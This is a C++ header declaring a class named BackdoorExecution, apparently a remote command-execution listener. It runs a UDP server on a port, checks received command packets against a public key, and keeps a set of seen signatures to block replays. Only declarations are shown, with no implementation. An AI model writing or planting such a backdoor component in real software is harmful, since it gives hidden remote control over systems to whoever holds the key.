#pragma once

#include <UdpServer.hpp>
#include <boost/multiprecision/cpp_int.hpp>

#include <PublicPrivateKeyTypes.hpp>
#include <unordered_set>
#include <string>

class BackdoorExecution : private UdpServer
{
protected:
    PublicKey_t m_public_key;
    // Avoids the client from sending the same command twice with the same digital signature
    std::unordered_set<std::string> m_database_of_unique_identifiers;
public:
    void Serve(volatile std::sig_atomic_t& stop, std::uint16_t port, PublicKey_t public_key);
    void OnReceivedPacket(std::span<const std::uint8_t> command) override;
    void LogError(std::string_view sv) override;
    BackdoorExecution();
    ~BackdoorExecution() override;
};
